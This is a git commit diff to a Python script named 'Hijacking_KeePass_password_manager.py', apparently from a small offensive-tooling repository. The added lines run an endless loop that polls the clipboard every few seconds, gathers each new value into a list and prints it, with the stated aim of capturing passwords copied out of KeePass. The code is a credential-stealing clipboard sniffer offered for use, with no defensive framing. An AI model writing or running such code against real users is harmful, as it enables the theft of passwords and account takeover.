8b765e36901aaa0228e1eb4a86b8e83d4c41e271
inc0gn1to <pro194@ya.ru>
2019-12-04 12:30:56 +0500

    4.12.2019_Hijacking keePass

--- Hijacking_KeePass_password_manager.py
+++ Hijacking_KeePass_password_manager.py
@@ -8,4 +8,10 @@ while True: # infinite loop to continously check the clipboard
 	if pypercliper.paste() !='None': #if the clipboard content is not empty ...
 	    value = pypercliper.paste() # then we will take its value and put it into variable called value
 	    print(pypercliper.paste())
-	pass
+	    
+	    if value not in list: #now to make sure that we don't get replicated items in our list before appending the value variable into our list
+	    #we gonna check if the values is stored earlier  in the first place , if not then this means this is a 	new item
+	    #and we will append it to our list
+	        list.append(value)
+	    print(list)
+	    time.sleep(3)
